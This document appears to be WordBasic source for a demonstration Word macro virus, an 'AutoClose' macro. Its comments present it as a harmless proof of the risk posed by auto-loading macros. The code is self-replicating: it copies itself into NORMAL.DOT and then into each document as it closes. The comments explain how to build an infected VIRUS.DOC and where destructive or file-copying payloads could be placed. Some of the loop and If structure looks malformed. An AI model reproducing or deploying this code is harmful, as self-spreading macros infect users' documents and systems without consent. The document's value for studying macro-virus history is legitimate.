Rem This demonstrates an application-specific document virus
Rem generated by an automatic macro in Microsoft Word for
Rem Windows 6.0. Code is executed each time a document is closed.
Rem This macro is only a demonstration, and does not perform any
Rem destructive actions.

Rem The purpose of this code is to reveal a significant security
Rem risk in software that supports macro languages with
Rem auto-loading capabilities.  Current virus detection tools are
Rem not presently capable of detecting this type of virus, and
Rem most users are blissfully unaware that threats can come from
Rem documents.

Rem Paste this code in the macro Window of a Word document
Rem template. Save the macro as AutoClose.  Enter some random
Rem text in the main word processing window and save the document.
Rem Now copy the file, naming the new file VIRUS.DOC.  Open
Rem VIRUS.DOC in Word.  It will appear as a normal document, but
Rem when you close the document, the virus will execute.

Rem Message boxes display progress as the code is executed.
Rem Code is commented.

Public Sub MAIN()

title$ = "Document Macro Virus"
WordBasic.MsgBox "Counting global macros.", title$, 16
Rem check how many macros are globally available.
total = WordBasic.CountMacros(0)
present = 0

Rem Check and see if the AutoClose macro is installed in global.
If total > 0 Then
For cycle = 1 To total
If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
WordBasic.MsgBox "AutoClose macro vir. is already installed in NORMAL.DOT.", title$, 16
        present = 1
End If
'End If

Rem Get the current document name.
a$ = WordBasic.[WindowName$]() + ":AutoClose"

Rem If AutoClose isn't present, then copy it to NORMAL.DOT.
If present <> 1 Then
WordBasic.MacroCopy a$, "Global:AutoClose"
WordBasic.MsgBox "Infected NORMAL.DOT with copy of AutoClose macro virus.", title$, 16

Rem The following code infects a document each time it is closed.
Rem This effectively spreads the macro virus each time an infected
Rem document is opened by Word.

Else
 Rem If AutoClose is already global and the file hasn't been
 Rem infected yet, save the current file as a
 Rem template instead of a document so the macro can be
 Rem attached.

 Rem See if AutoClose is already in the document.  Don't need
 Rem to check names because the virus would be the only code
 Rem putting a macro in a document.

 present = 0
 If WordBasic.CountMacros(1) <> 0 Then
 WordBasic.MsgBox "AutoClose macro virus already present in this document.", title$, 16
 present = 1
 End If

 Rem Save the document as a template.

 If present = 0 Then
 WordBasic.FileSaveAs Format:=1
 WordBasic.MsgBox "Saved current document as template.", title$, 16

 Rem Then copy the AutoClose macro from NORMAL.DOT.

 WordBasic.MacroCopy "Global:AutoClose", a$
WordBasic.MsgBox "Infected current doc. with copy of AutoClose macro vir.", title$, 16
End If
End If

Rem After the document or NORMAL.DOT has been infected, then
Rem execute the following macro code (this could be destructive,
Rem such as a Kill command, invasive, such as a Connect and
Rem CopyFile command, or harmless, with no malacious intent).

WordBasic.MsgBox "Macro vir. has been spread. Now execute some other code.", title$, 16
